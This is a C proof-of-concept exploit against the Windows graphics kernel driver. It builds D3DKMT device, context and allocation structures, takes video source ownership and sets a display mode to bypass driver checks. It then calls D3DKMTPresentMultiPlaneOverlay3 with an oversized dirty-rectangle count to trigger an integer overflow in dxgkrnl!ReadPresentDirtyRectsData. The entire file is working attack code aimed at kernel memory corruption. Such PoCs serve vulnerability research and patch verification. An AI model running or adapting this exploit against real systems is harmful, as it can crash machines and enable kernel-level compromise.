#include <stdio.h>
#include <Windows.h>
#include <tchar.h>
#include <d3dkmthk.h>
#include <winternl.h>
#include <strsafe.h>
#include <assert.h>
#include <conio.h>

typedef enum { L_DEBUG, L_INFO, L_WARN, L_ERROR } LEVEL, * PLEVEL;
#define MAX_LOG_MESSAGE 1024
BOOL LogMessage(LEVEL Level, LPCTSTR Format, ...)
{
	TCHAR Buffer[MAX_LOG_MESSAGE] = { 0 };
	va_list Args;

	va_start(Args, Format);
	StringCchVPrintf(Buffer, MAX_LOG_MESSAGE, Format, Args);
	va_end(Args);

	switch (Level) {
	case L_DEBUG: _ftprintf(stdout, TEXT("[?] %s\n"), Buffer); break;
	case L_INFO:  _ftprintf(stdout, TEXT("[+] %s\n"), Buffer); break;
	case L_WARN:  _ftprintf(stderr, TEXT("[*] %s\n"), Buffer); break;
	case L_ERROR: _ftprintf(stderr, TEXT("[!] %s\n"), Buffer); break;
	}

	fflush(stdout);
	fflush(stderr);

	return TRUE;
}

int main()
{
	D3DKMT_OPENADAPTERFROMHDC D3dKmtOpenAdapter = { 0 };
	D3DKMT_CREATEDEVICE D3dKmtCreateDevice = { 0 };
	D3DKMT_CREATECONTEXT D3dKmtCreateContext = { 0 };

	D3DKMT_CREATEALLOCATION D3dKmtCreateAllocation = { 0 };
	D3DKMT_MULTIPLANE_OVERLAY3* pPresentPlane = (D3DKMT_MULTIPLANE_OVERLAY3*)malloc(sizeof(D3DKMT_MULTIPLANE_OVERLAY3) + 1);
	D3DKMT_MULTIPLANE_OVERLAY* pPresentPlane1 = (D3DKMT_MULTIPLANE_OVERLAY*)malloc(sizeof(D3DKMT_MULTIPLANE_OVERLAY) + 1);
	D3DKMT_MULTIPLANE_OVERLAY_ATTRIBUTES3* pMultiAttribute = (D3DKMT_MULTIPLANE_OVERLAY_ATTRIBUTES3*)malloc(sizeof(D3DKMT_MULTIPLANE_OVERLAY_ATTRIBUTES3) + 1);
	memset(pMultiAttribute, 0x0, sizeof(D3DKMT_MULTIPLANE_OVERLAY_ATTRIBUTES3) + 1);
	memset(pPresentPlane, 0x00, sizeof(pPresentPlane) + 1);
	D3DKMT_HANDLE* pContextList = (D3DKMT_HANDLE*)malloc(sizeof(D3DKMT_HANDLE) + 1);
	memset(pContextList, 0x0, sizeof(D3DKMT_HANDLE) + 1);
	PVOID* pPrivateAllocationInfo = (PVOID*)malloc(0x80);
	memset(pPrivateAllocationInfo, 0x0, 0x80);      //Fake pPrivateAllocationInfo it is important in SetDisplayMode -> DISPLAY_ADAPTER::GetDisplayMode
	DWORD64 copy1 = 0x400800;
	DWORD64 copy2 = 0x55600000015;
	DWORD64 copy3 = 0x100000300;
	DWORD64 copy4 = 0x155800000001;
	DWORD64 copy5 = 0x2;
	DWORD64 copy6 = 0x18a0060;
	DWORD64 copy7 = 0x10000008d;
	DWORD64 copy8 = 0x30000000556;
	DWORD64 copy9 = 0x1;
	DWORD64 copy10 = 0x7;
	DWORD64 copy11 = 0x100000003;
	DWORD64 copy12 = 0x3e8;
	DWORD64 copy13 = 0xea6000000000;

	CopyMemory(pPrivateAllocationInfo, &copy1, 0x8);
	CopyMemory((VOID*)((DWORD64)pPrivateAllocationInfo + (DWORD64)0x8), &copy2, 0x8);
	CopyMemory((VOID*)((DWORD64)pPrivateAllocationInfo + (DWORD64)0x10), &copy3, 0x8);
	CopyMemory((VOID*)((DWORD64)pPrivateAllocationInfo + (DWORD64)0x18), &copy4, 0x8);
	CopyMemory((VOID*)((DWORD64)pPrivateAllocationInfo + (DWORD64)0x20), &copy5, 0x8);
	CopyMemory((VOID*)((DWORD64)pPrivateAllocationInfo + (DWORD64)0x28), &copy6, 0x8);
	CopyMemory((VOID*)((DWORD64)pPrivateAllocationInfo + (DWORD64)0x30), &copy7, 0x8);
	CopyMemory((VOID*)((DWORD64)pPrivateAllocationInfo + (DWORD64)0x38), &copy8, 0x8);
	CopyMemory((VOID*)((DWORD64)pPrivateAllocationInfo + (DWORD64)0x40), &copy9, 0x8);
	CopyMemory((VOID*)((DWORD64)pPrivateAllocationInfo + (DWORD64)0x50), &copy13, 0x8);
	CopyMemory((VOID*)((DWORD64)pPrivateAllocationInfo + (DWORD64)0x58), &copy12, 0x8);
	CopyMemory((VOID*)((DWORD64)pPrivateAllocationInfo + (DWORD64)0x60), &copy10, 0x8);
	CopyMemory((VOID*)((DWORD64)pPrivateAllocationInfo + (DWORD64)0x68), &copy11, 0x8);
	RECT pSrcRECT = { 0 };
	RECT pDstRECT = { 0 };
	RECT pClipRECT = { 0 };
	PVOID pDirtyRECT = (PVOID)malloc(sizeof(RECT) * 0xffffffe);
	HDC hDevice = NULL;
	D3DKMT_PRESENT pPresent = { 0 };
	NTSTATUS ntstat;

	/* Step 1: get display adapter for device */
	D3DKMT_ENUMADAPTERS D3dKmtEnumAdapters = { 0 };
	ntstat = D3DKMTEnumAdapters(&D3dKmtEnumAdapters);

	if (ntstat)
	{
		LogMessage(L_ERROR, L"Enum Adapter error");
		exit(-1);
	}
	LogMessage(L_INFO, L"Create Adapter: 0x%p", D3dKmtEnumAdapters);

	PVOID pPrivate = (PVOID)malloc(0x500);
	memset(pPrivate, 0x41, sizeof(pPrivate));
	D3dKmtCreateDevice.hAdapter = D3dKmtEnumAdapters.Adapters[0].hAdapter;
	D3dKmtCreateDevice.Flags.RequestVSync = TRUE;

	D3DKMT_CURRENTDISPLAYMODE* pPrivateData = (D3DKMT_CURRENTDISPLAYMODE*)malloc(sizeof(D3DKMT_CURRENTDISPLAYMODE));
	memset(pPrivateData, 0x0, sizeof(D3DKMT_CURRENTDISPLAYMODE));
	DWORD pPrivateDataSize = sizeof(D3DKMT_CURRENTDISPLAYMODE);
	D3DKMT_QUERYADAPTERINFO D3dKmtQueryAdapter = { 0 };
	D3dKmtQueryAdapter.hAdapter = D3dKmtEnumAdapters.Adapters[0].hAdapter;
	D3dKmtQueryAdapter.PrivateDriverDataSize = pPrivateDataSize;
	D3dKmtQueryAdapter.Type = KMTQAITYPE_CURRENTDISPLAYMODE;
	D3dKmtQueryAdapter.pPrivateDriverData = pPrivateData;

	/* Step 2: query adapter private data */
	ntstat = D3DKMTQueryAdapterInfo(&D3dKmtQueryAdapter);
	if (ntstat)
	{
		LogMessage(L_ERROR, L"Query Adapterinfo error...0x%p", ntstat);
		exit(-1);
	}

	/* Step 3: create device for context */
	ntstat = D3DKMTCreateDevice(&D3dKmtCreateDevice);
	if (ntstat)
	{
		LogMessage(L_ERROR, L"Create Device error");
		exit(-1);
	}
	LogMessage(L_INFO, L"Create Device : 0x%p", D3dKmtCreateDevice.hDevice);

	D3dKmtCreateContext.NodeOrdinal = 0;
	D3dKmtCreateContext.hDevice = D3dKmtCreateDevice.hDevice;

	/* Step 4: create context */
	ntstat = D3DKMTCreateContext(&D3dKmtCreateContext);
	if (ntstat)
	{
		LogMessage(L_ERROR, L"Create Context error");
		exit(-1);
	}
	LogMessage(L_INFO, L"Create Context : 0x%p", D3dKmtCreateContext.hContext);

	/* Step 5: generate D3DKMT_PRESENT_MULTIPLANE_OVERLAY3 structure and rect layout for trigger vulnerability */
	pSrcRECT.bottom = 0x30;
	pSrcRECT.left = 0x20;
	pSrcRECT.right = 0x40;
	pSrcRECT.top = 0x10;
	pDstRECT.bottom = 0x30;
	pDstRECT.left = 0x20;
	pDstRECT.right = 0x40;
	pDstRECT.top = 0x10;
	pClipRECT.bottom = 0x30;
	pClipRECT.left = 0x20;
	pClipRECT.right = 0x40;
	pClipRECT.top = 0x10;

	DWORD bottom = 0x30;
	DWORD left = 0x20;
	DWORD right = 0x40;
	DWORD top = 0x10;

	for (int i = 0; i < 0xffffffe; i++)
	{
		CopyMemory((VOID*)((DWORD64)pDirtyRECT + (DWORD64)i * 0x10), &left, 0x4);
		CopyMemory((VOID*)((DWORD64)pDirtyRECT + (DWORD64)i * 0x10 + 0x4), &top, 0x4);
		CopyMemory((VOID*)((DWORD64)pDirtyRECT + (DWORD64)i * 0x10 + 0x8), &right, 0x4);
		CopyMemory((VOID*)((DWORD64)pDirtyRECT + (DWORD64)i * 0x10 + 0xc), &bottom, 0x4);
	}

	D3DKMT_PRESENT_MULTIPLANE_OVERLAY3 D3dKmtPresentMulti = { 0 };
	pMultiAttribute->Flags = 0x2;
	pMultiAttribute->SrcRect = pSrcRECT;
	pMultiAttribute->DstRect = pDstRECT;
	pMultiAttribute->ClipRect = pClipRECT;
	pMultiAttribute->DirtyRectCount = 0xffffffe; //Integer Overflow Count
	pMultiAttribute->Rotation = D3DDDI_ROTATION_IDENTITY;
	pMultiAttribute->Blend = D3DKMT_MULTIPLANE_OVERLAY_BLEND_ALPHABLEND;

	pMultiAttribute->pDirtyRects = (RECT*)pDirtyRECT;
	D3dKmtPresentMulti.hAdapter = D3dKmtEnumAdapters.Adapters[0].hAdapter;;
	D3dKmtPresentMulti.PresentCount = 0x10;
	D3dKmtPresentMulti.PresentPlaneCount = 0x1;
	D3dKmtPresentMulti.ContextCount = 0x1;
	D3dKmtPresentMulti.VidPnSourceId = 0;
	pPresentPlane->LayerIndex = 0;
	pPresentPlane->pAllocationList = NULL;
	pPresentPlane->pPlaneAttributes = pMultiAttribute;
	pPresentPlane->InputFlags.Enabled = TRUE;
	pPresentPlane->FlipInterval = (D3DDDI_FLIPINTERVAL_TYPE)0x1;
	pPresentPlane->DriverPrivateDataSize = 0xffffffff;
	D3dKmtPresentMulti.Flags.Value = 0xA0;


	D3dKmtPresentMulti.ppPresentPlanes = &pPresentPlane;
	D3dKmtPresentMulti.pContextList = &D3dKmtCreateContext.hContext;
	D3DKMT_SETVIDPNSOURCEOWNER D3dSet = { 0 };
	DWORD typetr = 2;
	DWORD sourceID = 0;
	D3DKMT_VIDPNSOURCEOWNER_TYPE* Type = (D3DKMT_VIDPNSOURCEOWNER_TYPE*)&typetr;
	D3DDDI_VIDEO_PRESENT_SOURCE_ID* SourceID = (D3DDDI_VIDEO_PRESENT_SOURCE_ID*)&sourceID;

	D3dSet.hDevice = D3dKmtCreateDevice.hDevice;
	D3dSet.pType = Type;
	D3dSet.pVidPnSourceId = SourceID;
	D3dSet.VidPnSourceCount = 1;

	/* Step 6: invoke SetVidPnSourceOwner for bypass ADAPTER_DISPLAY::IsVidPnSourceOwner check in D3DKMTPresentMultiPlaneOverlay3 */
	ntstat = D3DKMTSetVidPnSourceOwner(&D3dSet);
	if (ntstat)
	{
		LogMessage(L_ERROR, L"Set Vid Pn Source owner error");
		exit(-1);
	}

	//////////////////
	D3DKMT_CREATEALLOCATION CreateAllocation;
	D3DDDI_ALLOCATIONINFO AllocationInfo;
	DWORD Flag = 0x4;
	memset(&CreateAllocation, 0, sizeof(CreateAllocation));
	CreateAllocation.hDevice = D3dKmtCreateDevice.hDevice;
	CreateAllocation.NumAllocations = 1;
	CreateAllocation.pAllocationInfo = &AllocationInfo;

	AllocationInfo.hAllocation = NULL;
	AllocationInfo.pSystemMem = NULL;  // Vidmem allocation
	AllocationInfo.pPrivateDriverData = pPrivateAllocationInfo;  // Contains format, size, and so on.
	AllocationInfo.PrivateDriverDataSize = 0x80;
	AllocationInfo.Flags.Primary = TRUE;
	AllocationInfo.VidPnSourceId = 0;
	
	/* Step 7: create allocation for SetDisplayMode */
	ntstat = D3DKMTCreateAllocation(&CreateAllocation);
	if (ntstat)
	{
		LogMessage(L_ERROR, L"CreateAllocation failure...0x%p", ntstat);
		exit(-1);
	}

	memcpy(pPrivateData, D3dKmtQueryAdapter.pPrivateDriverData, sizeof(D3DKMT_DISPLAYMODE) + 1);
	D3DKMT_SETDISPLAYMODE D3dKmtSetDis = { 0 };
	D3dKmtSetDis.hDevice = D3dKmtCreateDevice.hDevice;
	D3dKmtSetDis.DisplayOrientation = pPrivateData->DisplayMode.DisplayOrientation;
	D3dKmtSetDis.ScanLineOrdering = pPrivateData->DisplayMode.ScanLineOrdering;
	D3dKmtSetDis.hPrimaryAllocation = AllocationInfo.hAllocation;
	D3dKmtSetDis.Flags.PreserveVidPn = TRUE;

	/* Step 8: invoke SetDisplayMode to bypass check in D3DKMTPresentMultiPlaneOverlay3 */
	ntstat = D3DKMTSetDisplayMode(&D3dKmtSetDis);
	if (ntstat)
	{
		LogMessage(L_ERROR, L"Set DisplayMode failure...0x%p", ntstat);
		exit(-1);
	}

	/* Step 9: final invoke D3DKMTPresentMultiPlaneOverlay3 to trigger integer overflow in dxgkrnl!ReadPresentDirtyRectsData */
	ntstat = D3DKMTPresentMultiPlaneOverlay3(&D3dKmtPresentMulti);//Trigger Integer Overflow
	if (ntstat)
	{
		LogMessage(L_ERROR, L"D3DKMT Present failure...0x%p", ntstat);
		exit(-1);
	}
	LogMessage(L_INFO, L"If show this, PoC failure...");
	return 0;
}